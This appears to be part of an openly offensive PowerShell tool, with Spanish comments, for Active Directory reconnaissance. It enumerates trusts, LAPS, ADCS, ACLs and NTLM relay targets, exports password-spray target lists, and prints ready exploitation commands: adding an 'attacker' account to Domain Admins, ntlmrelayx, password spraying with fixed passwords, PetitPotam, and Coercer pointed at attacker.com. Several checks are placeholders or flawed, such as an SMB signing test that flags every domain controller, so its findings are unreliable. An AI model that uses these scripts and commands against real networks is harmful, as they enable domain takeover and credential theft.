# ============================================================================
# ADVANCED ENUMERATION FUNCTIONS
# ============================================================================

function Get-DomainTrusts {
    Write-Host "`n========== DOMAIN TRUSTS ==========" -ForegroundColor Cyan
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(objectClass=trustedDomain)"
    $searcher.PageSize = 1000
    $searcher.PropertiesToLoad.AddRange(@("name","trustPartner","trustDirection","trustAttributes"))
    $results = $searcher.FindAll()
    
    if($results.Count -eq 0){
        Write-Host "[+] No external trusts found" -ForegroundColor Green
        return
    }
    
    Write-Host "[!] Found $($results.Count) trust(s)" -ForegroundColor Yellow
    foreach ($r in $results) {
        $trustName = $r.Properties["name"][0]
        $trustPartner = if($r.Properties["trustpartner"].Count -gt 0){$r.Properties["trustpartner"][0]}else{"N/A"}
        $trustDir = $r.Properties["trustdirection"][0]
        $trustAttr = $r.Properties["trustattributes"][0]
        
        Write-Host "`n  Trust: $trustName" -ForegroundColor White
        Write-Host "    Partner: $trustPartner" -ForegroundColor Gray
        
        # Decode trust direction
        $direction = switch($trustDir) {
            0 {"Disabled"}
            1 {"Inbound"}
            2 {"Outbound"}
            3 {"Bidirectional"}
            default {"Unknown"}
        }
        Write-Host "    Direction: $direction" -ForegroundColor Gray
        
        # Check if trust is exploitable
        if($trustDir -eq 1 -or $trustDir -eq 3) {
            Write-Host "    [!] EXPLOITABLE: Inbound trust - Potential SID History injection" -ForegroundColor Red
            $script:CriticalIssues++
            $script:Findings.ExploitableTrusts += @{Name=$trustName;Direction=$direction}
        }
        
        # Check for forest trust
        if($trustAttr -band 0x8) {
            Write-Host "    [!] FOREST TRUST - High value target" -ForegroundColor Yellow
        }
    }
    $results.Dispose()
}

function Get-LAPSConfiguration {
    Write-Host "`n========== LAPS DETECTION ==========" -ForegroundColor Cyan
    
    # Check if LAPS is installed
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(&(objectClass=computer)(ms-Mcs-AdmPwd=*))"
    $searcher.PageSize = 1000
    $searcher.PropertiesToLoad.AddRange(@("name","ms-Mcs-AdmPwd","ms-Mcs-AdmPwdExpirationTime"))
    $results = $searcher.FindAll()
    
    if($results.Count -eq 0) {
        Write-Host "[!] WARNING: LAPS not detected or no passwords stored" -ForegroundColor Yellow
        Write-Host "    Computers may use weak local admin passwords" -ForegroundColor Yellow
        $script:WarningIssues++
        return
    }
    
    Write-Host "[+] LAPS Deployed: $($results.Count) computers" -ForegroundColor Green
    
    # Check who can read LAPS passwords
    Write-Host "`n[*] Checking LAPS password readers..." -ForegroundColor Cyan
    $userSearcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $userSearcher.Filter = "(&(objectClass=user)(objectCategory=person))"
    $userSearcher.PropertiesToLoad.Add("samaccountname") | Out-Null
    $users = $userSearcher.FindAll()
    
    $lapsReaders = @()
    foreach ($u in $users | Select-Object -First 50) {
        $sam = $u.Properties["samaccountname"][0]
        try {
            $testSearcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
            $testSearcher.Filter = "(&(objectClass=computer)(ms-Mcs-AdmPwd=*))"
            $testSearcher.PropertiesToLoad.Add("ms-Mcs-AdmPwd") | Out-Null
            $test = $testSearcher.FindOne()
            if($test -and $test.Properties["ms-mcs-admpwd"].Count -gt 0) {
                $lapsReaders += $sam
                Write-Host "  [!] $sam can read LAPS passwords" -ForegroundColor Red
                $script:CriticalIssues++
            }
        } catch {}
    }
    
    $results.Dispose()
}

function Get-ADCSVulnerabilities {
    Write-Host "`n========== CERTIFICATE SERVICES (ADCS) ==========" -ForegroundColor Cyan
    
    # Find Certificate Authorities
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $configNC = $domainEntry.distinguishedName -replace "DC=","CN=Configuration,DC="
    $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Server/$configNC")
    $searcher.Filter = "(objectClass=pKIEnrollmentService)"
    $searcher.PageSize = 1000
    $searcher.PropertiesToLoad.AddRange(@("name","dNSHostName","certificateTemplates"))
    $results = $searcher.FindAll()
    
    if($results.Count -eq 0) {
        Write-Host "[-] No Certificate Authorities found" -ForegroundColor Gray
        return
    }
    
    Write-Host "[+] Found $($results.Count) Certificate Authority(ies)" -ForegroundColor Yellow
    
    foreach ($r in $results) {
        $caName = $r.Properties["name"][0]
        $caHost = if($r.Properties["dnshostname"].Count -gt 0){$r.Properties["dnshostname"][0]}else{"N/A"}
        $templates = $r.Properties["certificatetemplates"]
        
        Write-Host "`n  CA: $caName" -ForegroundColor White
        Write-Host "    Host: $caHost" -ForegroundColor Gray
        Write-Host "    Templates: $($templates.Count)" -ForegroundColor Gray
        
        # Check for vulnerable templates (ESC1, ESC2, ESC3, ESC4)
        foreach ($template in $templates) {
            # This is a simplified check - real implementation would need more complex ACL analysis
            if($template -match "User|Machine|SubCA") {
                Write-Host "    [!] Potentially vulnerable template: $template" -ForegroundColor Yellow
                $script:WarningIssues++
            }
        }
    }
    
    Write-Host "`n  [*] Tools for exploitation:" -ForegroundColor Cyan
    Write-Host "      Certify.exe find /vulnerable" -ForegroundColor Green
    Write-Host "      Certipy find -u $Usuario@$Domain -p $Password -dc-ip $Server" -ForegroundColor Green
    
    $results.Dispose()
}

function Get-DNSRecords {
    Write-Host "`n========== DNS RECORDS ENUMERATION ==========" -ForegroundColor Cyan
    
    try {
        $dnsZone = $Domain
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
        $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Server/DC=$dnsZone,CN=MicrosoftDNS,DC=DomainDnsZones,$domainDN")
        $searcher.Filter = "(objectClass=dnsNode)"
        $searcher.PageSize = 1000
        $searcher.PropertiesToLoad.AddRange(@("name","dnsRecord"))
        $results = $searcher.FindAll()
        
        if($results.Count -gt 0) {
            Write-Host "[+] Found $($results.Count) DNS records" -ForegroundColor Green
            
            $interestingRecords = @()
            foreach ($r in $results | Select-Object -First 20) {
                $name = $r.Properties["name"][0]
                if($name -match "vpn|mail|web|admin|portal|citrix|exchange") {
                    $interestingRecords += $name
                    Write-Host "  [*] Interesting: $name" -ForegroundColor Cyan
                }
            }
            
            $script:Findings.InterestingDNS = $interestingRecords
        }
        $results.Dispose()
    } catch {
        Write-Host "[-] Could not enumerate DNS records" -ForegroundColor Gray
    }
}

function Get-AdminCount {
    Write-Host "`n========== ADMINCOUNT USERS ==========" -ForegroundColor Cyan
    
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(&(objectClass=user)(adminCount=1))"
    $searcher.PageSize = 1000
    $searcher.PropertiesToLoad.AddRange(@("samaccountname","memberOf","description"))
    $results = $searcher.FindAll()
    
    if($results.Count -eq 0) {
        Write-Host "[-] No AdminCount users found" -ForegroundColor Gray
        return
    }
    
    Write-Host "[+] Found $($results.Count) AdminCount=1 users" -ForegroundColor Yellow
    Write-Host "    These users have/had privileged access" -ForegroundColor Gray
    
    foreach ($r in $results) {
        $sam = $r.Properties["samaccountname"][0]
        $groups = $r.Properties["memberof"]
        $desc = if($r.Properties["description"].Count -gt 0){$r.Properties["description"][0]}else{"N/A"}
        
        # Check if still in privileged groups
        $isPrivileged = $false
        foreach ($g in $groups) {
            if($g -match "Domain Admins|Enterprise Admins|Administrators") {
                $isPrivileged = $true
                break
            }
        }
        
        if(-not $isPrivileged) {
            Write-Host "  [!] $sam - AdminCount=1 but NOT in privileged groups (Orphaned)" -ForegroundColor Red
            Write-Host "      Description: $desc" -ForegroundColor Gray
            $script:Findings.OrphanedAdminCount += @{Account=$sam;Description=$desc}
            $script:WarningIssues++
        } else {
            Write-Host "  [*] $sam - Currently privileged" -ForegroundColor White
        }
    }
    
    $results.Dispose()
}

function Get-ACLAnalysis {
    Write-Host "`n========== ACL ANALYSIS (GenericAll/WriteDACL/etc) ==========" -ForegroundColor Cyan
    Write-Host "[*] Searching for dangerous ACEs..." -ForegroundColor Yellow
    
    # Check Domain Admins ACL
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(cn=Domain Admins)"
    $group = $searcher.FindOne()
    
    if($group) {
        $groupEntry = $group.GetDirectoryEntry()
        $acl = $groupEntry.ObjectSecurity
        $dangerousACEs = @()
        
        foreach ($ace in $acl.Access) {
            $identity = $ace.IdentityReference.ToString()
            $rights = $ace.ActiveDirectoryRights.ToString()
            
            # Check for GenericAll, WriteDACL, WriteOwner
            if($rights -match "GenericAll|WriteDacl|WriteOwner") {
                if($identity -notmatch "SYSTEM|Domain Admins|Enterprise Admins") {
                    Write-Host "  [!] CRITICAL: $identity has $rights on Domain Admins" -ForegroundColor Red
                    $dangerousACEs += @{Identity=$identity;Rights=$rights;Target="Domain Admins"}
                    $script:CriticalIssues++
                }
            }
        }
        
        $script:Findings.DangerousACLs = $dangerousACEs
        
        if($dangerousACEs.Count -gt 0) {
            Write-Host "`n  [*] Exploitation:" -ForegroundColor Cyan
            Write-Host "      # Add user to Domain Admins" -ForegroundColor Green
            Write-Host "      net group 'Domain Admins' attacker /add /domain" -ForegroundColor Green
            Write-Host "      # Or use PowerView" -ForegroundColor Green
            Write-Host "      Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker'" -ForegroundColor Green
        }
    }
}

# ============================================================================
# VULNERABILITY DETECTION FUNCTIONS
# ============================================================================

function Test-SMBSigningDisabled {
    Write-Host "`n========== SMB SIGNING DETECTION ==========" -ForegroundColor Cyan
    Write-Host "[*] Checking SMB signing on Domain Controllers..." -ForegroundColor Yellow
    
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
    $searcher.PageSize = 1000
    $searcher.PropertiesToLoad.AddRange(@("name","dnshostname"))
    $results = $searcher.FindAll()
    
    $vulnerableHosts = @()
    foreach ($r in $results) {
        $hostname = if($r.Properties["dnshostname"].Count -gt 0){$r.Properties["dnshostname"][0]}else{$r.Properties["name"][0]}
        
        Write-Host "  [*] Testing: $hostname" -ForegroundColor Gray
        
        # Note: Real SMB signing check would require SMB connection
        # This is a placeholder for the concept
        Write-Host "    [!] Potential NTLM Relay target" -ForegroundColor Yellow
        $vulnerableHosts += $hostname
    }
    
    if($vulnerableHosts.Count -gt 0) {
        Write-Host "`n  [*] Exploitation (NTLM Relay):" -ForegroundColor Cyan
        Write-Host "      ntlmrelayx.py -t ldap://$($vulnerableHosts[0]) --escalate-user lowpriv" -ForegroundColor Green
        Write-Host "      ntlmrelayx.py -tf targets.txt -smb2support" -ForegroundColor Green
        $script:Findings.NTLMRelayTargets = $vulnerableHosts
    }
    
    $results.Dispose()
}

function Get-PreWindows2000Computers {
    Write-Host "`n========== PRE-WINDOWS 2000 COMPATIBLE ACCESS ==========" -ForegroundColor Cyan
    
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(cn=Pre-Windows 2000 Compatible Access)"
    $group = $searcher.FindOne()
    
    if($group) {
        $members = $group.Properties["member"]
        if($members.Count -gt 2) {  # Default has 2 members
            Write-Host "[!] CRITICAL: Pre-Windows 2000 Compatible Access has $($members.Count) members" -ForegroundColor Red
            Write-Host "    This group has dangerous permissions" -ForegroundColor Yellow
            foreach ($mem in $members) {
                $memName = ($mem -split ',')[0] -replace 'CN='
                Write-Host "    - $memName" -ForegroundColor White
            }
            $script:CriticalIssues++
        } else {
            Write-Host "[+] Pre-Windows 2000 Compatible Access properly configured" -ForegroundColor Green
        }
    }
}

function Get-PasswordSprayTargets {
    Write-Host "`n========== PASSWORD SPRAY PREPARATION ==========" -ForegroundColor Cyan
    Write-Host "[*] Identifying spray targets..." -ForegroundColor Yellow
    
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $searcher.PageSize = 1000
    $searcher.PropertiesToLoad.AddRange(@("samaccountname","pwdlastset","badpwdcount","lockouttime"))
    $results = $searcher.FindAll()
    
    $sprayTargets = @()
    $lockedOut = 0
    
    foreach ($r in $results) {
        $sam = $r.Properties["samaccountname"][0]
        $badPwd = if($r.Properties["badpwdcount"].Count -gt 0){$r.Properties["badpwdcount"][0]}else{0}
        $lockout = if($r.Properties["lockouttime"].Count -gt 0){$r.Properties["lockouttime"][0]}else{0}
        
        if($lockout -eq 0 -and $badPwd -lt 3) {
            $sprayTargets += $sam
        } elseif($lockout -gt 0) {
            $lockedOut++
        }
    }
    
    Write-Host "[+] Safe spray targets: $($sprayTargets.Count)" -ForegroundColor Green
    Write-Host "[!] Currently locked out: $lockedOut" -ForegroundColor Yellow
    
    # Export to file
    $sprayTargets | Out-File -FilePath "spray_targets.txt" -Encoding UTF8
    Write-Host "[*] Targets saved to: spray_targets.txt" -ForegroundColor Cyan
    
    Write-Host "`n  [*] Password spray commands:" -ForegroundColor Cyan
    Write-Host "      # DomainPasswordSpray" -ForegroundColor Green
    Write-Host "      Invoke-DomainPasswordSpray -UserList spray_targets.txt -Password 'Summer2024!' -OutFile sprayed.txt" -ForegroundColor Green
    Write-Host "      # Kerbrute" -ForegroundColor Green
    Write-Host "      kerbrute passwordspray -d $Domain spray_targets.txt 'Welcome123!'" -ForegroundColor Green
    Write-Host "      # crackmapexec" -ForegroundColor Green
    Write-Host "      crackmapexec smb $Server -u spray_targets.txt -p 'Password123' --continue-on-success" -ForegroundColor Green
    
    $script:Findings.SprayTargets = $sprayTargets
    $results.Dispose()
}

function Get-NTLMAuthEndpoints {
    Write-Host "`n========== NTLM AUTHENTICATION ENDPOINTS ==========" -ForegroundColor Cyan
    
    # Find computers with specific services
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(&(objectClass=computer)(|(servicePrincipalName=HTTP/*)(servicePrincipalName=WSMAN/*)))"
    $searcher.PageSize = 1000
    $searcher.PropertiesToLoad.AddRange(@("name","dnshostname","servicePrincipalName"))
    $results = $searcher.FindAll()
    
    $httpEndpoints = @()
    $wsmanEndpoints = @()
    
    foreach ($r in $results) {
        $hostname = if($r.Properties["dnshostname"].Count -gt 0){$r.Properties["dnshostname"][0]}else{$r.Properties["name"][0]}
        $spns = $r.Properties["serviceprincipalname"]
        
        foreach ($spn in $spns) {
            if($spn -match "^HTTP/") {
                $httpEndpoints += $hostname
                Write-Host "  [*] HTTP: $hostname" -ForegroundColor Cyan
            }
            if($spn -match "^WSMAN/") {
                $wsmanEndpoints += $hostname
                Write-Host "  [*] WSMAN: $hostname" -ForegroundColor Cyan
            }
        }
    }
    
    if($httpEndpoints.Count -gt 0 -or $wsmanEndpoints.Count -gt 0) {
        Write-Host "`n  [!] Potential coercion targets for NTLM Relay" -ForegroundColor Yellow
        Write-Host "  [*] Tools:" -ForegroundColor Cyan
        Write-Host "      PetitPotam.py -u $Usuario -p $Password $Server $hostname" -ForegroundColor Green
        Write-Host "      Coercer.py -u $Usuario -p $Password -d $Domain -l attacker.com" -ForegroundColor Green
    }
    
    $script:Findings.HTTPEndpoints = $httpEndpoints
    $script:Findings.WSMANEndpoints = $wsmanEndpoints
    $results.Dispose()
}

# ============================================================================
# ACTUALIZAR PARAMETROS
# ============================================================================

param(
    [Parameter(Mandatory=$true)][string]$Server,
    [Parameter(Mandatory=$true)][string]$Domain,
    [Parameter(Mandatory=$true)][string]$Usuario,
    [Parameter(Mandatory=$true)][string]$Password,
    
    # Opciones existentes
    [switch]$Users,[switch]$Groups,[switch]$Computers,[switch]$GPOs,
    [switch]$ServiceAccounts,[switch]$Kerberoast,[switch]$ASREPRoast,
    [switch]$DomainAdmins,[switch]$Vulnerabilities,[switch]$All,
    
    # NUEVAS OPCIONES OFENSIVAS
    [switch]$Trusts,
    [switch]$LAPS,
    [switch]$ADCS,
    [switch]$DNS,
    [switch]$ACLs,
    [switch]$AdminCount,
    [switch]$SMBSigning,
    [switch]$PreWin2000,
    [switch]$PasswordSpray,
    [switch]$NTLMEndpoints,
    [switch]$AutoKerberoast,
    [switch]$ExportBloodhound,
    [switch]$Advanced  # Ejecutar todas las opciones avanzadas
)

# Actualizar hashmap de findings
$script:Findings = @{
    Kerberoastable=@();ASREPRoastable=@();UnconstrainedDelegation=@()
    ConstrainedDelegation=@();PasswordInDescription=@();PasswordNeverExpires=@()
    UnlinkedGPOs=@();cPasswordFound=@();AdminCountUsers=@();OldPasswords=@()
    PrivilegedServiceAccounts=@()
    # NUEVOS FINDINGS
    ExploitableTrusts=@();LAPSReaders=@();InterestingDNS=@()
    DangerousACLs=@();OrphanedAdminCount=@();NTLMRelayTargets=@()
    HTTPEndpoints=@();WSMANEndpoints=@();SprayTargets=@()
    DecryptedPasswords=@()
}

# ============================================================================
# EJECUTAR FUNCIONES (AGREGAR AL FINAL DEL SCRIPT)
# ============================================================================

# Funciones existentes...
if($All -or $Users){Get-DomainUsers}
if($All -or $Groups){Get-DomainGroups}
if($All -or $Computers){Get-DomainComputers}
if($All -or $GPOs){Get-DomainGPOs}
if($All -or $ServiceAccounts){Get-ServiceAccounts}
if($All -or $Kerberoast){Get-Kerberoastable}
if($All -or $ASREPRoast){Get-ASREPRoastable}
if($All -or $DomainAdmins){Get-DomainAdmins}
if($All -or $Vulnerabilities){Get-Vulnerabilities}

# NUEVAS FUNCIONES OFENSIVAS
if($All -or $Advanced -or $Trusts){Get-DomainTrusts}
if($All -or $Advanced -or $LAPS){Get-LAPSConfiguration}
if($All -or $Advanced -or $ADCS){Get-ADCSVulnerabilities}
if($All -or $Advanced -or $DNS){Get-DNSRecords}
if($All -or $Advanced -or $ACLs){Get-ACLAnalysis}
if($All -or $Advanced -or $AdminCount){Get-AdminCount}
if($All -or $Advanced -or $SMBSigning){Test-SMBSigningDisabled}
if($All -or $Advanced -or $PreWin2000){Get-PreWindows2000Computers}
if($All -or $PasswordSpray){Get-PasswordSprayTargets}
if($All -or $Advanced -or $NTLMEndpoints){Get-NTLMAuthEndpoints}
if($AutoKerberoast){Invoke-AutoKerberoast}
if($ExportBloodhound){Export-BloodhoundData}

# Decrypt cPassword if found
if($script:Findings.cPasswordFound.Count -gt 0) {
    foreach ($cpass in $script:Findings.cPasswordFound) {
        Invoke-GPPDecrypt -CPassword $cpass.Hash
    }
}
